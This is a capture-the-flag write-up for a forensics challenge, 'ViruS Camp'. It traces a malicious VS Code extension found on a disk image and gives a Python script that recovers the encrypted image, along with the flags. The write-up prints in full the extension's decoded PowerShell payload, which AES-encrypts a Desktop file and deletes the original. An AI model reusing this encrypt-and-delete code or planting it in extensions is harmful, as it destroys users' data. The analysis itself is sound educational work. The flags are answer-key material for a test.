# ViruS Camp

Points: 

> 

`Author: `

---

The light theme stuff in the description made me thing of the `.config` files so I mounted the image and looked for hidden directories. I saw `.vscode` and went in. I knew I found something because the name of the extension was `undefined_publisher.activate-0.0.1/`

exploring it a little more showed me a file with a base64 comment at the bottom which had the flag.

```sh
❯ echo "VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9" | base64 -d
The 1st flag is: BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}⏎
```

After this I went into a little bit of a rabbit hole of the structure of a VSCode extension. I should instead have just read that file in a little more detail though. So basically the extension offers just one command "Run Shell", that is running some malicious powershell code when called which encrypts a `flag.png` in your `~/Desktop` with AES. The malicious powershell was very weakly obfuscated by just `base64` -> `reverse the string` so that was easy. Finally we just had to decrypt the `flag.enc` to get the image which contained the flag.

```powershell
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encryptor = $aes.CreateEncryptor()

$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()

$cryptoStream.Close()
$outStream.Close()

Remove-Item $inputFile -Force
```

`solve.py`
```py
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

password = "MyS3cr3tP4ssw0rd"  
salt = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08])  
iterations = 10000
key_size = 32  
iv_size = 16  

key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)
key = key_iv[:key_size]
iv = key_iv[key_size:]

input_file = "flag.enc"
output_file = "flag.png"

with open(input_file, "rb") as f:
    encrypted_data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_data = cipher.decrypt(encrypted_data)

pad_length = decrypted_data[-1]
decrypted_data = decrypted_data[:-pad_length]

with open(output_file, "wb") as f:
    f.write(decrypted_data)

print(f"Decryption complete! Saved as {output_file}")
```

---

BITSCTF{h0pe_y0u_enj0yed_th1s_145e3f1a}
